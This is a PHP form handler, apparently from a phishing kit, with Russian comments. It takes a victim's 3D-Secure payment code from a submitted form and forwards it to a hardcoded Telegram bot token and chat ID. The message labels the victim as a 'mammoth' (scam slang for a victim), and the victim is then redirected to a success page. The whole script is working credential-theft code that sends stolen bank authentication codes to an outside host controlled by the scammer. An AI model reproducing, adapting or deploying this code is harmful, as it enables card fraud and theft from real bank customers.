
<?php

//В переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5269596206:AAHMsmsU05t5pUAG6KdFFSEFGp1RpocU9OA";

//Сюда вставляем chat_id
$chat_id = "-783916466";

//Определяем переменные для передачи данных из нашей формы
if ($_POST['act'] == 'order') {
    $secure = ($_POST['securecode']);
   
//Собираем в массив то, что будет передаваться боту
    $arr = array(
        '⚠️ Мамонт ввел код' => '',
        ''=>'',
        '🔐 3D-Secure: ' => $secure,

);
//Настраиваем внешний вид сообщения в телеграме
    foreach($arr as $key => $value) {
        $txt .=  "<b>".$key."</b> ".$value."%0A";
    };

//Передаем данные боту
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

//Выводим сообщение об успешной отправке
if ($sendToTelegram) {
    echo "<script> window.location.href = './success.php';</script>";
}
}

?>